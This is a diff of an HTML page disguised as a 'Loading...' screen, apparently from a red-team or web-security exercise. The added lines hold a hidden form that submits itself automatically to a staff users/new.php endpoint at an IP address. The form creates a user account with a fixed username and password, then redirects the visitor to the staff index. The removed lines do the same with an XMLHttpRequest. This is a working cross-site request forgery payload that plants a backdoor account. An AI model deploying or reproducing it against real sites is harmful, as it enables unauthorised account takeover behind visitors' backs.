@@ -10,10 +10,23 @@
 
 <body>
     <h3>Loading...</h3>
-    <p>Please wait</p>
+    <p></p>
+    <div style="display: none">
+        <form action="https://104.198.208.81/red/public/staff/users/new.php" style="display: none" id="form1" method="POST">
+            <input name="first_name" value="Johnny">
+            <input name="last_name" value="Bravo">
+            <input name="username" value="johnnybravo">
+            <input name="email" value="johnnybravo@gmail.com">
+            <input type="password" name="password" value="111111111Aa#">
+            <input type="password" name="confirm_password" value="111111111Aa#">
+            <button id="myform" type="submit" form="form1" value="Create">Create</button>
+        </form>
+    </div>
     <script>
-    x=new XMLHttpRequest();x.open("POST","https://104.198.208.81/red/public/staff/users/new.php",true);
-    x.setRequestHeader('Content-Type',"application/x-www-form-urlencoded");x.send('first_name=Johnny&last_name=Bravo&username=johnnybravo&email=johnnybravo%40gmail.com&password=111111111Aa%23&confirm_password=111111111Aa%23')
+        setTimeout(() => {
+            document.location = "https://104.198.208.81/red/public/staff/index.php"
+        }, 1000)
+        document.getElementById("myform").click();
     </script>
 </body>
 
